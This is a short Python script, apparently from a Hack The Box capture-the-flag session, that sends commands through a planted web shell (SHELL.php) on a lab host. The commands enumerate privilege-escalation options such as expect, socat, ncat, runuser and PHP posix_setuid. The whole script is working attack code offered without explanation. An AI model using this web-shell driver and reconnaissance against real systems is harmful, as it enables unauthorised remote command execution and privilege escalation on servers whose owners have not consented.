import urllib.request, urllib.parse

cmds = [
    "which runuser chpst sg expect ck-launch-session 2>/dev/null",
    "ls -la /usr/sbin/unix_chkpwd 2>&1",
    # Check if there's an expect-like tool
    "which expect 2>&1",
    "which socat 2>&1",
    "which ncat 2>&1",
    # Can we use php to change user?
    "php -r 'echo extension_loaded(\"posix\") ? \"posix\" : \"no\"; echo \" \"; echo function_exists(\"posix_setuid\") ? \"setuid\" : \"nosetuid\";' 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:500])
            print()
    except Exception as e:
        pass
